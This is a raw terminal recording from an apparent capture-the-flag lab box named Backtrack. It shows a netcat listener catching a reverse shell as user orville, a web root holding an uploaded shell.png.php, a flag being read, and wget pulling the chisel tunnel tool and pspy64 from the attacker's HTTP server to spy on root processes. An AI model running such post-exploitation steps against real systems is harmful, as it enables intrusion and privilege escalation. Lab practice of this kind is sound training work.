@@ -1,0 +1,1693 @@
+Script started on 2025-01-16 14:10:38+03:00 [COMMAND="nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+listening on [any] 4444 ...
+^C
+
+Script done on 2025-01-16 14:58:11+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-16 14:58:15+03:00 [COMMAND="nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+listening on [any] 4444 ...
+connect to [10.9.3.166] from (UNKNOWN) [10.10.16.225] 34846
+SOCKET: Shell has connected! PID: 10645
+id
+uid=1003(orville) gid=1003(orville) groups=1003(orville)
+python3 -c 'import pty;pty.spawn("/bin/bash"0 0 )'
+orville@Backtrack:/var/www/html$ ls
+ls
+css            includes   login.php   navbar.php    shell.png.php
+dashboard.php  index.php  logout.php  register.php  uploads
+orville@Backtrack:/var/www/html$ cd
+cd
+bash: cd: HOME not set
+orville@Backtrack:/var/www/html$ ls
+ls
+css            includes   login.php   navbar.php    shell.png.php
+dashboard.php  index.php  logout.php  register.php  uploads
+orville@Backtrack:/var/www/html$ cd /home
+cd /home
+orville@Backtrack:/home$ ls
+ls
+orville  wilbur
+orville@Backtrack:/home$ cd orville
+cd orville
+orville@Backtrack:/home/orville$ ls
+ls
+flag2.txt  web_snapshot.zip
+orville@Backtrack:/home/orville$ cat flag2, .txt
+cat flag2.txt
+THM{01d8e83d0ea776345fa9bf4bc08c249d}
+orville@Backtrack:/home/orville$ wget http://10.9.3.166:8080? /chisel
+wget http://10.9.3.166:8080/chisel
+--2025-01-16 12:11:15--  http://10.9.3.166:8080/chisel
+Connecting to 10.9.3.166:8080... failed: Connection refused.
+orville@Backtrack:/home/orville$ wget http://10.9.3.166:8080/chisel         00/chisel
+wget http://10.9.3.166:8000/chisel
+--2025-01-16 12:11:32--  http://10.9.3.166:8000/chisel
+Connecting to 10.9.3.166:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9371800 (8.9M) [application/octet-stream]
+Saving to: ‘chisel’
+
+chisel                0%[                    ]       0  --.-KB/s               chisel                0%[                    ]  12.46K  47.6KB/s               chisel                0%[                    ]  28.66K  59.9KB/s               chisel                0%[                    ]  42.37K  61.2KB/s               chisel                0%[                    ]  58.57K  65.3KB/s               chisel                0%[                    ]  68.54K  61.5KB/s               chisel                0%[                    ]  76.01K  57.5KB/s               chisel                0%[                    ]  83.49K  54.5KB/s               chisel                1%[                    ]  95.95K  55.2KB/s               chisel                1%[                    ] 113.39K  57.9KB/s               chisel                1%[                    ] 133.33K  61.5KB/s               chisel                1%[                    ] 144.55K  60.4KB/s               chisel                1%[                    ] 164.48K  63.4KB/s               chisel                2%[                    ] 184.42K  65.7KB/s               chisel                2%[                    ] 198.13K  65.8KB/s    eta 2m 16s chisel                2%[                    ] 201.87K  60.5KB/s    eta 2m 16s chisel                2%[                    ] 239.25K  66.9KB/s    eta 2m 16s chisel                2%[                    ] 241.74K  63.4KB/s    eta 2m 16s chisel                2%[                    ] 259.19K  65.8KB/s    eta 2m 18s chisel                3%[                    ] 286.60K  68.9KB/s    eta 2m 18s chisel                3%[                    ] 310.28K  72.3KB/s    eta 2m 18s chisel                3%[                    ] 333.95K  74.2KB/s    eta 2m 18s chisel                3%[                    ] 357.63K  79.8KB/s    eta 2m 18s chisel                3%[                    ] 361.37K  76.3KB/s    eta 2m 5s  chisel                4%[                    ] 417.44K  88.1KB/s    eta 2m 5s  chisel                4%[                    ] 426.16K  86.0KB/s    eta 2m 5s  chisel                4%[                    ] 452.33K  88.2KB/s    eta 2m 5s  chisel                5%[>                   ] 477.25K  90.2KB/s    eta 2m 5s  chisel                5%[>                   ] 505.91K  94.8KB/s    eta 1m 46s chisel                5%[>                   ] 535.82K  97.6KB/s    eta 1m 46s chisel                6%[>                   ] 568.22K   102KB/s    eta 1m 46s chisel                6%[>                   ] 595.63K   113KB/s    eta 1m 46s chisel                6%[>                   ] 628.03K   111KB/s    eta 1m 46s chisel                7%[>                   ] 657.94K   120KB/s    eta 93s    chisel                7%[>                   ] 672.89K   121KB/s    eta 93s    chisel                7%[>                   ] 687.84K   117KB/s    eta 93s    chisel                7%[>                   ] 701.55K   115KB/s    eta 93s    chisel                7%[>                   ] 721.49K   113KB/s    eta 93s    chisel                8%[>                   ] 745.16K   113KB/s    eta 93s    chisel                8%[>                   ] 781.30K   127KB/s    eta 93s    chisel                8%[>                   ] 819.93K   121KB/s    eta 93s    chisel                9%[>                   ] 857.31K   130KB/s    eta 93s    chisel                9%[>                   ] 889.71K   134KB/s    eta 93s    chisel               10%[=>                  ] 920.86K   136KB/s    eta 83s    chisel               10%[=>                  ] 942.05K   133KB/s    eta 83s    chisel               10%[=>                  ] 966.97K   132KB/s    eta 83s    chisel               10%[=>                  ] 988.15K   128KB/s    eta 83s    chisel               10%[=>                  ]   1003K   116KB/s    eta 84s    chisel               11%[=>                  ]   1.02M   117KB/s    eta 84s    chisel               11%[=>                  ]   1.03M   114KB/s    eta 84s    chisel               11%[=>                  ]   1.04M   112KB/s    eta 84s    chisel               11%[=>                  ]   1.05M   113KB/s    eta 84s    chisel               11%[=>                  ]   1.07M   113KB/s    eta 84s    chisel               12%[=>                  ]   1.08M   111KB/s    eta 84s    chisel               12%[=>                  ]   1.10M   106KB/s    eta 84s    chisel               12%[=>                  ]   1.11M  98.9KB/s    eta 84s    chisel               12%[=>                  ]   1.12M  92.2KB/s    eta 84s    chisel               12%[=>                  ]   1.13M  85.7KB/s    eta 86s    chisel               12%[=>                  ]   1.14M  71.4KB/s    eta 86s    chisel               13%[=>                  ]   1.20M  80.9KB/s    eta 86s    chisel               13%[=>                  ]   1.23M  84.7KB/s    eta 86s    chisel               14%[=>                  ]   1.26M  87.6KB/s    eta 82s    chisel               14%[=>                  ]   1.30M  92.7KB/s    eta 82s    chisel               14%[=>                  ]   1.34M   104KB/s    eta 82s    chisel               15%[==>                 ]   1.38M   107KB/s    eta 82s    chisel               16%[==>                 ]   1.43M   118KB/s    eta 82s    chisel               16%[==>                 ]   1.47M   126KB/s    eta 73s    chisel               16%[==>                 ]   1.51M   132KB/s    eta 73s    chisel               17%[==>                 ]   1.54M   137KB/s    eta 73s    chisel               17%[==>                 ]   1.59M   148KB/s    eta 73s    chisel               18%[==>                 ]   1.62M   152KB/s    eta 73s    chisel               18%[==>                 ]   1.66M   159KB/s    eta 68s    chisel               18%[==>                 ]   1.70M   167KB/s    eta 68s    chisel               19%[==>                 ]   1.74M   181KB/s    eta 68s    chisel               19%[==>                 ]   1.76M   195KB/s    eta 68s    chisel               19%[==>                 ]   1.78M   183KB/s    eta 68s    chisel               20%[===>                ]   1.81M   181KB/s    eta 65s    chisel               20%[===>                ]   1.82M   173KB/s    eta 65s    chisel               20%[===>                ]   1.83M   165KB/s    eta 65s    chisel               20%[===>                ]   1.86M   159KB/s    eta 65s    chisel               21%[===>                ]   1.88M   154KB/s    eta 65s    chisel               21%[===>                ]   1.90M   146KB/s    eta 65s    chisel               21%[===>                ]   1.93M   144KB/s    eta 65s    chisel               21%[===>                ]   1.96M   139KB/s    eta 65s    chisel               22%[===>                ]   1.97M   108KB/s    eta 67s    chisel               22%[===>                ]   1.97M  88.3KB/s    eta 67s    chisel               22%[===>                ]   1.97M  74.7KB/s    eta 74s    chisel               22%[===>                ]   1.98M  66.2KB/s    eta 74s    chisel               22%[===>                ]   2.01M  64.6KB/s    eta 74s    chisel               22%[===>                ]   2.04M  62.7KB/s    eta 75s    chisel               23%[===>                ]   2.06M  59.7KB/s    eta 75s    chisel               25%[====>               ]   2.25M  82.9KB/s    eta 75s    chisel               25%[====>               ]   2.30M  82.8KB/s    eta 75s    chisel               28%[====>               ]   2.50M   112KB/s    eta 75s    chisel               30%[=====>              ]   2.74M   143KB/s    eta 52s    chisel               31%[=====>              ]   2.78M   147KB/s    eta 52s    chisel               31%[=====>              ]   2.82M   153KB/s    eta 52s    chisel               32%[=====>              ]   2.87M   157KB/s    eta 52s    chisel               32%[=====>              ]   2.91M   159KB/s    eta 52s    chisel               32%[=====>              ]   2.94M   160KB/s    eta 49s    chisel               33%[=====>              ]   2.98M   164KB/s    eta 49s    chisel               33%[=====>              ]   3.02M   165KB/s    eta 49s    chisel               34%[=====>              ]   3.05M   166KB/s    eta 49s    chisel               34%[=====>              ]   3.09M   343KB/s    eta 49s    chisel               34%[=====>              ]   3.13M   350KB/s    eta 47s    chisel               35%[======>             ]   3.16M   352KB/s    eta 47s    chisel               35%[======>             ]   3.20M   355KB/s    eta 47s    chisel               35%[======>             ]   3.22M   306KB/s    eta 47s    chisel               36%[======>             ]   3.25M   233KB/s    eta 47s    chisel               36%[======>             ]   3.25M   190KB/s    eta 47s    chisel               36%[======>             ]   3.25M   160KB/s    eta 50s    chisel               36%[======>             ]   3.25M   124KB/s    eta 50s    chisel               36%[======>             ]   3.28M   120KB/s    eta 50s    chisel               36%[======>             ]   3.29M  86.1KB/s    eta 50s    chisel               37%[======>             ]   3.32M  85.2KB/s    eta 50s    chisel               42%[=======>            ]   3.77M   133KB/s    eta 42s    chisel               42%[=======>            ]   3.79M   130KB/s    eta 42s    chisel               42%[=======>            ]   3.81M   129KB/s    eta 42s    chisel               42%[=======>            ]   3.82M   125KB/s    eta 42s    chisel               44%[=======>            ]   4.02M   147KB/s    eta 42s    chisel               45%[========>           ]   4.04M   145KB/s    eta 38s    chisel               45%[========>           ]   4.05M   141KB/s    eta 38s    chisel               45%[========>           ]   4.06M   138KB/s    eta 38s    chisel               45%[========>           ]   4.08M   136KB/s    eta 38s    chisel               45%[========>           ]   4.10M   133KB/s    eta 38s    chisel               46%[========>           ]   4.12M   132KB/s    eta 38s    chisel               46%[========>           ]   4.13M   130KB/s    eta 38s    chisel               46%[========>           ]   4.15M   232KB/s    eta 38s    chisel               46%[========>           ]   4.16M   229KB/s    eta 38s    chisel               46%[========>           ]   4.17M   226KB/s    eta 38s    chisel               46%[========>           ]   4.19M   221KB/s    eta 38s    chisel               47%[========>           ]   4.21M   136KB/s    eta 38s    chisel               47%[========>           ]   4.24M   140KB/s    eta 38s    chisel               47%[========>           ]   4.27M   142KB/s    eta 38s    chisel               48%[========>           ]   4.30M   146KB/s    eta 38s    chisel               48%[========>           ]   4.32M  94.6KB/s    eta 37s    chisel               48%[========>           ]   4.35M  96.8KB/s    eta 37s    chisel               49%[========>           ]   4.38M   101KB/s    eta 37s    chisel               49%[========>           ]   4.41M   106KB/s    eta 37s    chisel               49%[========>           ]   4.42M   105KB/s    eta 37s    chisel               49%[========>           ]   4.44M   104KB/s    eta 36s    chisel               49%[========>           ]   4.46M   103KB/s    eta 36s    chisel               50%[=========>          ]   4.48M   107KB/s    eta 36s    chisel               50%[=========>          ]   4.50M   106KB/s    eta 36s    chisel               50%[=========>          ]   4.52M   111KB/s    eta 36s    chisel               50%[=========>          ]   4.55M   120KB/s    eta 35s    chisel               51%[=========>          ]   4.59M   125KB/s    eta 35s    chisel               51%[=========>          ]   4.64M   134KB/s    eta 35s    chisel               52%[=========>          ]   4.69M   141KB/s    eta 35s    chisel               53%[=========>          ]   4.76M   151KB/s    eta 35s    chisel               53%[=========>          ]   4.82M   160KB/s    eta 32s    chisel               54%[=========>          ]   4.85M   165KB/s    eta 32s    chisel               54%[=========>          ]   4.88M   166KB/s    eta 32s    chisel               54%[=========>          ]   4.91M   129KB/s    eta 32s    chisel               54%[=========>          ]   4.91M   105KB/s    eta 32s    chisel               54%[=========>          ]   4.91M  88.6KB/s    eta 34s    chisel               54%[=========>          ]   4.91M  76.6KB/s    eta 34s    chisel               55%[==========>         ]   4.92M  74.0KB/s    eta 35s    chisel               55%[==========>         ]   4.95M  76.3KB/s    eta 35s    chisel               61%[===========>        ]   5.47M   151KB/s    eta 35s    chisel               61%[===========>        ]   5.50M   144KB/s    eta 27s    chisel               62%[===========>        ]   5.55M   149KB/s    eta 27s    chisel               62%[===========>        ]   5.57M   148KB/s    eta 27s    chisel               62%[===========>        ]   5.59M   148KB/s    eta 27s    chisel               62%[===========>        ]   5.62M   147KB/s    eta 27s    chisel               63%[===========>        ]   5.66M   147KB/s    eta 26s    chisel               63%[===========>        ]   5.71M   147KB/s    eta 26s    chisel               64%[===========>        ]   5.77M   144KB/s    eta 26s    chisel               65%[============>       ]   5.83M   145KB/s    eta 26s    chisel               65%[============>       ]   5.87M   144KB/s    eta 26s    chisel               66%[============>       ]   5.92M   146KB/s    eta 23s    chisel               66%[============>       ]   5.96M   148KB/s    eta 23s    chisel               67%[============>       ]   6.00M   315KB/s    eta 23s    chisel               67%[============>       ]   6.04M   316KB/s    eta 23s    chisel               68%[============>       ]   6.08M   179KB/s    eta 23s    chisel               68%[============>       ]   6.12M   182KB/s    eta 21s    chisel               68%[============>       ]   6.14M   201KB/s    eta 21s    chisel               69%[============>       ]   6.17M   193KB/s    eta 21s    chisel               69%[============>       ]   6.22M   204KB/s    eta 21s    chisel               70%[=============>      ]   6.27M   212KB/s    eta 21s    chisel               70%[=============>      ]   6.33M   219KB/s    eta 20s    chisel               71%[=============>      ]   6.40M   230KB/s    eta 20s    chisel               72%[=============>      ]   6.48M   239KB/s    eta 20s    chisel               73%[=============>      ]   6.53M   238KB/s    eta 20s    chisel               73%[=============>      ]   6.58M   236KB/s    eta 20s    chisel               74%[=============>      ]   6.63M   239KB/s    eta 17s    chisel               74%[=============>      ]   6.69M   242KB/s    eta 17s    chisel               75%[==============>     ]   6.74M   243KB/s    eta 17s    chisel               76%[==============>     ]   6.80M   250KB/s    eta 17s    chisel               76%[==============>     ]   6.83M   234KB/s    eta 15s    chisel               78%[==============>     ]   7.04M   284KB/s    eta 15s    chisel               79%[==============>     ]   7.12M   295KB/s    eta 15s    chisel               80%[===============>    ]   7.19M   312KB/s    eta 15s    chisel               80%[===============>    ]   7.24M   314KB/s    eta 15s    chisel               81%[===============>    ]   7.29M   314KB/s    eta 11s    chisel               82%[===============>    ]   7.33M   312KB/s    eta 11s    chisel               82%[===============>    ]   7.38M   309KB/s    eta 11s    chisel               83%[===============>    ]   7.43M   303KB/s    eta 11s    chisel               83%[===============>    ]   7.49M   298KB/s    eta 11s    chisel               84%[===============>    ]   7.53M   293KB/s    eta 10s    chisel               84%[===============>    ]   7.57M   289KB/s    eta 10s    chisel               85%[================>   ]   7.62M   293KB/s    eta 10s    chisel               85%[================>   ]   7.67M   290KB/s    eta 10s    chisel               86%[================>   ]   7.71M   287KB/s    eta 10s    chisel               86%[================>   ]   7.75M   280KB/s    eta 8s     chisel               86%[================>   ]   7.77M   293KB/s    eta 8s     chisel               87%[================>   ]   7.80M   234KB/s    eta 8s     chisel               87%[================>   ]   7.85M   227KB/s    eta 8s     chisel               88%[================>   ]   7.88M   219KB/s    eta 8s     chisel               88%[================>   ]   7.93M   214KB/s    eta 7s     chisel               89%[================>   ]   7.97M   213KB/s    eta 7s     chisel               89%[================>   ]   8.01M   212KB/s    eta 7s     chisel               90%[=================>  ]   8.05M   210KB/s    eta 7s     chisel               90%[=================>  ]   8.08M   200KB/s    eta 7s     chisel               90%[=================>  ]   8.11M   195KB/s    eta 6s     chisel               90%[=================>  ]   8.13M   189KB/s    eta 6s     chisel               91%[=================>  ]   8.16M   185KB/s    eta 6s     chisel               91%[=================>  ]   8.19M   174KB/s    eta 6s     chisel               92%[=================>  ]   8.23M   174KB/s    eta 6s     chisel               92%[=================>  ]   8.26M   172KB/s    eta 5s     chisel               92%[=================>  ]   8.28M   168KB/s    eta 5s     chisel               92%[=================>  ]   8.29M   163KB/s    eta 5s     chisel               92%[=================>  ]   8.31M   156KB/s    eta 5s     chisel               93%[=================>  ]   8.32M   144KB/s    eta 5s     chisel               93%[=================>  ]   8.33M   138KB/s    eta 4s     chisel               93%[=================>  ]   8.34M   128KB/s    eta 4s     chisel               93%[=================>  ]   8.35M   112KB/s    eta 4s     chisel               93%[=================>  ]   8.37M   108KB/s    eta 4s     chisel               93%[=================>  ]   8.38M   102KB/s    eta 4s     chisel               94%[=================>  ]   8.40M  96.5KB/s    eta 4s     chisel               94%[=================>  ]   8.41M  86.4KB/s    eta 4s     chisel               94%[=================>  ]   8.46M  92.2KB/s    eta 4s     chisel               94%[=================>  ]   8.47M  87.7KB/s    eta 4s     chisel               94%[=================>  ]   8.48M  83.3KB/s    eta 3s     chisel               95%[==================> ]   8.50M  73.8KB/s    eta 3s     chisel               95%[==================> ]   8.52M  72.2KB/s    eta 3s     chisel               95%[==================> ]   8.54M  72.6KB/s    eta 3s     chisel               95%[==================> ]   8.56M  75.5KB/s    eta 3s     chisel               96%[==================> ]   8.60M  82.2KB/s    eta 2s     chisel               96%[==================> ]   8.63M  89.1KB/s    eta 2s     chisel               96%[==================> ]   8.67M  95.4KB/s    eta 2s     chisel               97%[==================> ]   8.67M  81.6KB/s    eta 2s     chisel               97%[==================> ]   8.70M  85.8KB/s    eta 2s     chisel               99%[==================> ]   8.85M   119KB/s    eta 2s     chisel               99%[==================> ]   8.87M   121KB/s    eta 2s     chisel               99%[==================> ]   8.89M   121KB/s    eta 2s     chisel               99%[==================> ]   8.91M   131KB/s    eta 0s     chisel              100%[===================>]   8.94M   129KB/s    in 62s     
+
+2025-01-16 12:12:35 (147 KB/s) - ‘chisel’ saved [9371800/9371800]
+
+orville@Backtrack:/home/orville$ ls
+ls
+chisel  flag2.txt  web_snapshot.zip
+orville@Backtrack:/home/orville$ chmod +x chisel
+chmod +x chisel
+orville@Backtrack:/home/orville$ ls  wget http://10.9.3.166:8000/pspy64
+wget http://10.9.3.166:8000/pspy64
+--2025-01-16 12:17:14--  http://10.9.3.166:8000/pspy64
+Connecting to 10.9.3.166:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                0%[                    ]       0  --.-KB/s               pspy64                0%[                    ]  16.20K  57.7KB/s               pspy64                1%[                    ]  41.12K  73.7KB/s               pspy64                2%[                    ]  84.01K   111KB/s               pspy64                3%[                    ] 111.43K  92.9KB/s               pspy64                4%[                    ] 133.33K  69.5KB/s               pspy64                4%[                    ] 135.82K  47.2KB/s               pspy64                4%[                    ] 137.07K  41.3KB/s    eta 70s    pspy64                4%[                    ] 139.56K  38.8KB/s    eta 70s    pspy64                4%[                    ] 142.05K  36.7KB/s    eta 70s    pspy64                4%[                    ] 148.29K  35.7KB/s    eta 70s    pspy64                5%[>                   ] 170.71K  38.5KB/s    eta 74s    pspy64                6%[>                   ] 191.90K  40.7KB/s    eta 74s    pspy64                7%[>                   ] 221.80K  45.1KB/s    eta 74s    pspy64                8%[>                   ] 255.45K  49.6KB/s    eta 74s    pspy64                9%[>                   ] 290.34K  54.3KB/s    eta 74s    pspy64               10%[=>                  ] 320.25K  57.7KB/s    eta 47s    pspy64               11%[=>                  ] 340.18K  59.1KB/s    eta 47s    pspy64               12%[=>                  ] 364.38K  59.3KB/s    eta 47s    pspy64               12%[=>                  ] 383.80K  58.3KB/s    eta 45s    pspy64               15%[==>                 ] 469.78K  68.4KB/s    eta 45s    pspy64               16%[==>                 ] 504.67K  67.9KB/s    eta 45s    pspy64               17%[==>                 ] 542.05K  71.4KB/s    eta 45s    pspy64               19%[==>                 ] 581.93K  81.4KB/s    eta 45s    pspy64               20%[===>                ] 625.54K   112KB/s    eta 29s    pspy64               21%[===>                ] 660.95K   130KB/s    eta 29s    pspy64               23%[===>                ] 697.81K   140KB/s    eta 29s    pspy64               24%[===>                ] 735.20K   147KB/s    eta 29s    pspy64               25%[====>               ] 770.09K   154KB/s    eta 29s    pspy64               26%[====>               ] 803.73K   157KB/s    eta 24s    pspy64               27%[====>               ] 848.59K   158KB/s    eta 24s    pspy64               29%[====>               ] 895.22K   159KB/s    eta 24s    pspy64               31%[=====>              ] 952.02K   169KB/s    eta 24s    pspy64               32%[=====>              ] 998.64K   175KB/s    eta 24s    pspy64               34%[=====>              ]   1.01M   188KB/s    eta 19s    pspy64               35%[======>             ]   1.06M   198KB/s    eta 19s    pspy64               37%[======>             ]   1.12M   200KB/s    eta 19s    pspy64               39%[======>             ]   1.16M   202KB/s    eta 19s    pspy64               40%[=======>            ]   1.20M   204KB/s    eta 19s    pspy64               42%[=======>            ]   1.25M   206KB/s    eta 15s    pspy64               42%[=======>            ]   1.26M   190KB/s    eta 15s    pspy64               44%[=======>            ]   1.32M   193KB/s    eta 15s    pspy64               46%[========>           ]   1.38M   196KB/s    eta 15s    pspy64               47%[========>           ]   1.41M   193KB/s    eta 13s    pspy64               48%[========>           ]   1.44M   193KB/s    eta 13s    pspy64               49%[========>           ]   1.48M   194KB/s    eta 13s    pspy64               51%[=========>          ]   1.52M   193KB/s    eta 13s    pspy64               53%[=========>          ]   1.58M   194KB/s    eta 13s    pspy64               54%[=========>          ]   1.62M   193KB/s    eta 11s    pspy64               56%[==========>         ]   1.67M   196KB/s    eta 11s    pspy64               58%[==========>         ]   1.72M   199KB/s    eta 11s    pspy64               59%[==========>         ]   1.77M   200KB/s    eta 11s    pspy64               61%[===========>        ]   1.83M   202KB/s    eta 11s    pspy64               63%[===========>        ]   1.88M   204KB/s    eta 8s     pspy64               65%[============>       ]   1.94M   209KB/s    eta 8s     pspy64               67%[============>       ]   1.98M   228KB/s    eta 8s     pspy64               68%[============>       ]   2.03M   223KB/s    eta 8s     pspy64               69%[============>       ]   2.07M   228KB/s    eta 8s     pspy64               71%[=============>      ]   2.13M   234KB/s    eta 6s     pspy64               74%[=============>      ]   2.19M   244KB/s    eta 6s     pspy64               75%[==============>     ]   2.24M   247KB/s    eta 6s     pspy64               77%[==============>     ]   2.29M   251KB/s    eta 6s     pspy64               79%[==============>     ]   2.36M   254KB/s    eta 6s     pspy64               81%[===============>    ]   2.41M   254KB/s    eta 4s     pspy64               83%[===============>    ]   2.46M   256KB/s    eta 4s     pspy64               84%[===============>    ]   2.51M   251KB/s    eta 4s     pspy64               85%[================>   ]   2.54M   245KB/s    eta 4s     pspy64               86%[================>   ]   2.57M   237KB/s    eta 4s     pspy64               87%[================>   ]   2.60M   230KB/s    eta 2s     pspy64               88%[================>   ]   2.63M   224KB/s    eta 2s     pspy64               89%[================>   ]   2.66M   218KB/s    eta 2s     pspy64               91%[=================>  ]   2.71M   215KB/s    eta 2s     pspy64               92%[=================>  ]   2.74M   212KB/s    eta 2s     pspy64               93%[=================>  ]   2.77M   205KB/s    eta 1s     pspy64               94%[=================>  ]   2.80M   196KB/s    eta 1s     pspy64               95%[==================> ]   2.83M   190KB/s    eta 1s     pspy64               97%[==================> ]   2.88M   194KB/s    eta 1s     pspy64               98%[==================> ]   2.92M   187KB/s    eta 1s     pspy64               99%[==================> ]   2.96M   182KB/s    eta 0s     pspy64              100%[===================>]   2.96M   181KB/s    in 19s     
+
+2025-01-16 12:17:34 (157 KB/s) - ‘pspy64’ saved [3104768/3104768]
+
+orville@Backtrack:/home/orville$ ls
+ls
+chisel  flag2.txt  pspy64  web_snapshot.zip
+orville@Backtrack:/home/orville$ chmod +x pspy64
+chmod +x pspy64
+orville@Backtrack:/home/orville$ ./pspy64
+./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12426  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12425  | (sd-executor) [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12424  | (sd-pam) [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12423  | /lib/systemd/systemd --user [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12422  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12421  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12420  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12419  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12418  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12417  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12413  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12412  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12411  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12410  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12409  | sshd: root [priv]    [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=12397  | /usr/bin/python3 /root/manage.py [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=12250  | ./pspy64 [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11851  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11850  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11849  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11848  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11679  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=11434  | [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=10930  | /bin/bash [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=10929  | python3 -c import pty;pty.spawn("/bin/bash") [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=10647  | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=10646  | sh [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=10645  | sh -c sh [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=10634  | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=10080  | [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1004  PID=9621   | -bash [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1004  PID=9620   | sshd: wilbur@pts/0   [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1004  PID=9545   | (sd-pam) [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=1004  PID=9544   | /lib/systemd/systemd --user [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=9415   | sshd: wilbur [priv]  [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=9411   | [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=9098   | [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=4139   | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=1159   | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [33;1mCMD: UID=113   PID=704    | /usr/sbin/mysqld [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=629    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=628    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=621    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=620    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [32;1mCMD: UID=1003  PID=619    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=611    | /usr/sbin/apache2 -k start [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=601    | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=597    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 [0m
+2025/01/16 12:19:13 [34;1mCMD: UID=0     PID=574    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal [0m
